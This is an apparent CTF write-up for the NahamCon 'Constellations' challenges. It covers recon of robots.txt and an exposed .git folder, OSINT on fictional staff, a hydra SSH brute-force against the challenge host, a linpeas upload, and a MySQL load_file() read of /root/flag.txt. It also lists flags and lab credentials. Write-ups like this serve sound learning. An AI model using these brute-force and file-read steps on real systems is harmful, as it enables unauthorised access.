# Constellations

> Konstantinos Pap 12/3/2021

Initially we find the first flag to unlock the missions on the nahamcon.com page under the 'The mission' tab
https://ctf.nahamcon.com/mission
flag{48e117a1464c3202714dc9a350533a59} 

Then we unlock the first actual mission...

## Bionic
We have a hint saying the flag is in the page `https://constellations.page`
Starting reccon on the website and looking over everything we find out that there's no flag there. After having a breakthrough and taking a look over at robots.txt i find the first flag

```
User-agent: *
Disallow: /meet-the-team.html

flag{33b5240485dda77430d3de22996297a1}  # this flag is for `Bionic`
```

## Meet the team
The hint tells us that we are looking for a publicly accessible version control software folder published on the constellations.page website itself. That means there should be something like git present there. Trying to navigate into /.git actually gets us a 403 forbidden error 
Using GitTools we download the whole .git/ directory and with git show on the second commit we manage to strip the flag

`flag{4063962f3a52f923ddb4411c139dd24c}`

## Gus
In the constellations website there is a link to a github. In there, there's a Gus guy which has a development repository. We can find the flag in his most recent commit.

`flag{84d5cc7e162895fa0a5834f1efdd0b32}`

## Lyra stage 1
Along side with the flag on Meet The Team challenge we found out employee names and surnames. That gives us the ability to find information about them on social media. With a bit of OSINT (Google dorking or sherlock) we can find that Lyra Patte exists on twitter. (https://mobile.twitter.com/lyrapatte). After reading her recent tweets we find a link to constellations.page for recruits. (https://constellations.page/constellations-documents/1/) No flag here though. But the way this url is formed is interesting. If we start messing with that last number we can find out that there are other pages as well. On page 5 we can find out flag.
`flag{bd869e6193c27308d2fd3ad4b427e8c3}`

## Lyra Stage 2 (Hydraulic)
On Lyra Stage 1 challenge we found a list of potential usernames and passwords. With that said we can start enumerate for the correct password over ssh using hydra. Hydra is a great tool for online bruteforcing services. Create 2 seperate files for the usernames and passwords and let's get hydra running.
`hydra -L usernames.txt -P passwords.txt ssh://challenge.nahamcon.com:31703`

Hydra eventually finds the correct credentials (username: pavo password: starsinthesky)
logging in with ssh with the above credentials we meet our flag.txt
`ssh pavo@challenge.nahamcon.com -p 31703`
flag{cadbbfd75d2547700221f8c2588e026e}

## Orion Stage 1
From the Meet The Meet challenge we can see an employee with the name Orion Morra. Using OSINT with google dorking or sherlock whatever works for you we can track down his social media. Apparently Orion has twitter https://twitter.com/OrionMorra/
In his tweets we find a photo containing his username and password for a later challenge probably (username: orion pasword: stars4love4life) and further down we can find another image that contains the flag 
flag{0bcffb17cbcbf4359a42ec45d0ccaf2}
(Hopefully i wrote it down correct)

## Orion Stage 2 (Internal)
Using the credentials from the previous challenge we log in to ssh.
`ssh -p 31441 orion@challenge.nahamcon.com`
After some manual enumeration we can't find any easy routes for priv esc but we notice mysql is running.
Uploading linpeas `scp -P 31441 linpeas.sh orion@challenge.nahamcon.com:/tmp/linpeas.sh` and running it we are waiting for the results... Eventually we see this.
```
[+] MySQL connection using default root/root ........... No
[+] MySQL connection using root/toor ................... No
[+] MySQL connection using root/NOPASS ................. Yes
User	Host	authentication_string
root	localhost	
root	internal-827001b62970e35f-7985c646bb-xrw7l	
root	127.0.0.1	
root	::1	
admin	%	NULL
```
We know that we can log into MySQL as a root with a password so that's what we do.
`mysql -u root`
And we are in mysql. Now since we are root we should be able to use a load_file() method that mysql offers and possibly read the flag.txt
```
mysql> show databases;

+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
+--------------------+
3 rows in set (0.00 sec)

mysql> use mysql;

mysql> select load_file('/root/flag.txt');
+-----------------------------------------+
| load_file('/root/flag.txt')             |
+-----------------------------------------+
| flag{183bdf6f145a1c97f0b4f520355e8ed5}
 |
+-----------------------------------------+
1 row in set (0.00 sec)

```
## Hercules Stage 1
In Gus' github there is a follower called Hercules. Inside the maintenance repo we can find the flag:

`flag{5bf9da15002d7ea53cb487f31781ce47}`

## Hercules Stage 2 (Degrade)
`ssh -p 32464 challenge.nahamcon.com`
`starstruckherc` is the password

No common privilege escalation vector found...
There is a reminder.txt on pamela's workspace however.... 
```
Management said I created a gaping security hole in this workstation and I need to fix it... golly I wish they would call me by nickname...
```
Not solved yet.

## Unknown twitter flag. 
In the constellations twitter page there is a flag which has not yet been found where it belongs...
flag{e483bffafbb0db5eabc121846b455bc7}